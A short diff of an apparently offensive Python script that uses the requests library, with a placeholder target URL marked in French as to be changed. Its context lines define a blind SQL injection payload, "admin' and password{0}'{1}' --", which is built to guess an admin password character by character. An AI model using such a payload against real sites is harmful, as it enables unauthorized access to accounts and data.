@@ -8,7 +8,7 @@
 
 import requests
  
-url = 'lien_du_site'
+url = 'lien_du_site' #a modifier
 length=8
 commande="admin' and password{0}'{1}' --"
 ##
